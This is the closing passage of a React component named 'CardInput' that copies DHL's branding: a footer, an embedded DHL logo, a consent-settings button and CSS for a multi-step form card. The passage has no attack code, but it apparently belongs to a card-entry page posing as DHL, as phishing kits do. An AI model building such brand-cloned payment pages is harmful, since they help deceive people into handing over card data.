          }}
        >
          <div
            style={{
              maxWidth: "1190px",
              margin: "0 auto",
              padding: "0 40px",
            }}
          >
            <div
              style={{
                display: "flex",
                flexWrap: "wrap",
                justifyContent: "space-between",
                alignItems: "center",
                gap: "20px",
              }}
            >
              <div
                style={{
                  display: "flex",
                  flexWrap: "wrap",
                  gap: "30px",
                  alignItems: "center",
                }}
              >
                <a
                  href="#"
                  style={{
                    color: DHL.footerText,
                    textDecoration: "none",
                    fontSize: "12px",
                  }}
                  onMouseEnter={(e) => (e.target.style.color = DHL.red)}
                  onMouseLeave={(e) => (e.target.style.color = DHL.footerText)}
                >
                  {t("privacyNotice")}
                </a>
                <button
                  id="ot-sdk-btn"
                  onClick={() => {
                    if (window.OneTrust && window.OneTrust.ToggleInfoDisplay) {
                      window.OneTrust.ToggleInfoDisplay();
                    }
                  }}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: DHL.footerText,
                    fontSize: "12px",
                    cursor: "pointer",
                    padding: 0,
                    fontFamily: "Arial, sans-serif",
                  }}
                  onMouseEnter={(e) => (e.target.style.color = DHL.red)}
                  onMouseLeave={(e) => (e.target.style.color = DHL.footerText)}
                >
                  {t("consentSettings")}
                </button>
              </div>

              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: isMobile ? "flex-start" : "flex-end",
                  gap: "10px",
                }}
              >
                <img
                  alt="DHL Logo"
                  src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCwxLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uODY1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+"
                  style={{
                    width: "128px",
                    height: "auto",
                  }}
                />
                <div
                  style={{
                    fontSize: "11px",
                    color: DHL.footerText,
                    marginTop: "6px",
                  }}
                >
                  © {currentYear} {t("copyright")}
                </div>
              </div>
            </div>
          </div>
        </footer>
      </main>

      <style>{`
        * { margin: 0; padding: 0; box-sizing: border-box; }
        .dhl-app { background: #f7f7f7; min-height: 100vh; width: 100%; overflow-x: hidden; }
        .dhl-main { width: 100%; margin: 0 auto; }
        .dhl-header { background: #ffcc00; padding: 30px 0; width: 100%; }
        .dhl-header-content { max-width: 1190px; margin: 0 auto; padding: 0 40px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
        .dhl-logo-area { flex: 1 1 auto; }
        .dhl-logo { height: auto; width: auto; max-height: 50px; max-width: 100%; }
        .dhl-right-header { display: flex; justify-content: flex-end; position: relative; }
        .dhl-lang-dropdown { display: flex; justify-content: flex-end; position: relative; }
        .dhl-lang-btn { display: flex; align-items: center; gap: 6px; padding: 6px 12px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.25); border-radius: 8px; color: #333; font-size: 0.82rem; font-weight: 500; cursor: pointer; font-family: inherit; background-color: rgba(255,255,255,0.5); transition: all 0.15s ease; }
        .dhl-lang-btn:hover { background-color: rgba(255,255,255,0.8); }
        .dhl-lang-flag { font-weight: 600; margin-right: 4px; }
        .dhl-lang-name { font-weight: 500; }
        .dhl-lang-menu { position: absolute; top: 100%; right: 0; margin-top: 8px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); min-width: 160px; z-index: 1000; overflow: hidden; border: 1px solid #e0e0e0; max-height: 400px; overflow-y: auto; }
        .dhl-lang-menu-item { display: flex; align-items: center; gap: 12px; width: 100%; padding: 10px 16px; border: none; background: white; cursor: pointer; font-family: inherit; font-size: 14px; transition: background 0.15s ease; text-align: left; }
        .dhl-lang-menu-item:hover { background: #f5f5f5; }
        .dhl-lang-menu-item.active { background: #ffcc00; color: #333; font-weight: 600; }
        .dhl-lang-menu-flag { font-weight: 600; min-width: 32px; color: #666; }
        .dhl-lang-menu-item.active .dhl-lang-menu-flag { color: #333; }
        .dhl-lang-menu-name { flex: 1; }
        .dhl-steps-container { padding-top: 90px; width: 100%; padding-bottom: 10px; }
        .dhl-steps { display: flex; align-items: flex-start; justify-content: center; width: 100%; margin: 0 auto 28px; padding: 0 16px; box-sizing: border-box; }
        .dhl-step { display: flex; flex-direction: column; align-items: center; flex-shrink: 1; }
        .dhl-step-circle { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 15px; font-weight: 700; transition: all 0.3s ease; flex-shrink: 0; }
        .dhl-step-circle.active { background: #333; color: #fff; box-shadow: 0 0 0 4px rgba(51,51,51,0.15); }
        .dhl-step-circle.upcoming { background: #fff; color: #999; border: 2px solid #ddd; }
        .dhl-step-label { font-size: 12px; font-weight: 600; text-align: center; margin-top: 8px; line-height: 1.3; max-width: 110px; color: #bbb; }
        .dhl-step-label.active { color: #333; font-weight: 700; }
        .dhl-step-line { flex: 1; height: 3px; min-width: 30px; max-width: 80px; background: #e5e5e5; margin-top: 19px; border-radius: 2px; }
        .dhl-form-card { max-width: 850px; margin: 0 auto 100px auto; padding: 30px 40px 40px; background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: calc(100% - 40px); }
        .dhl-form-title { font-size: clamp(24px, 5vw, 36px); font-weight: bold; margin-bottom: 10px; color: #333; line-height: 1.2; }
        .dhl-form { display: flex; flex-direction: column; gap: 20px; }
        .dhl-row { display: flex; gap: 20px; flex-wrap: wrap; }
        .dhl-col { flex: 1 1 calc(50% - 10px); min-width: 200px; }
        .dhl-full { width: 100%; }
        .dhl-field { position: relative; width: 100%; }
        .dhl-label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 6px; font-family: inherit; }
        .dhl-input { width: 100%; height: 48px; padding: 0 14px; font-size: 15px; border: 1.5px solid #d1d5db; border-radius: 8px; box-sizing: border-box; font-family: inherit; outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; background-color: #fff; }
        .dhl-input:focus { border-color: #d40511; border-width: 1.5px; box-shadow: 0 0 0 3px rgba(212,5,17,0.08); }
        .dhl-checkbox-wrapper { margin: 8px 0 4px; }
        .dhl-checkbox-row { display: flex; align-items: flex-start; gap: 10px; flex-wrap: wrap; }
        .dhl-checkbox { width: 18px; height: 18px; margin-top: 2px; cursor: pointer; flex-shrink: 0; }
        .dhl-checkbox-label { font-size: 14px; color: #333; line-height: 1.4; flex: 1; }
        .dhl-link { color: #d40511; text-decoration: underline; cursor: pointer; }
        .dhl-link:hover { color: #b00410; }
        .dhl-next-btn { display: block; width: 100%; padding: 15px; margin-top: 10px; background: #d40511; color: #fff; font-size: 17px; font-weight: 700; text-align: center; border: none; border-radius: 8px; cursor: pointer; box-sizing: border-box; font-family: inherit; transition: background 0.2s, transform 0.1s; }
        .dhl-next-btn:hover { background: #b00410; transform: translateY(-1px); }
        .dhl-next-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        @media (max-width: 768px) { .dhl-steps-container { padding-top: 60px; } .dhl-form-card { margin: 0 16px 60px 16px; padding: 24px 20px; } .dhl-form-title { font-size: 28px; margin-bottom: 24px; } .dhl-row { flex-direction: column; gap: 16px; } .dhl-col { width: 100%; } .dhl-header-content { padding: 0 20px; } }
        @media (max-width: 640px) { .dhl-steps-container { padding-top: 50px; } .dhl-steps { flex-wrap: wrap; justify-content: center; gap: 12px; } .dhl-step-line { display: none; } .dhl-form-card { margin: 0 12px 40px 12px; padding: 20px 16px; } .dhl-form-title { font-size: 24px; } .dhl-input { height: 44px; font-size: 14px; } .dhl-next-btn { padding: 14px; font-size: 16px; } }
        @media (max-width: 480px) { .dhl-lang-name { display: none; } .dhl-lang-btn { padding: 6px 8px; } .dhl-logo { max-height: 40px; } .dhl-header { padding: 20px 0; } .dhl-steps-container { padding-top: 40px; } .dhl-form-card { margin: 0 10px 30px 10px; padding: 18px 14px; } .dhl-form-title { font-size: 22px; } .dhl-label { font-size: 12px; } .dhl-input { height: 42px; font-size: 13px; } .dhl-next-btn { padding: 12px; font-size: 15px; } .dhl-lang-menu { min-width: 140px; } }
      `}</style>
    </div>
  );
}

export default CardInput;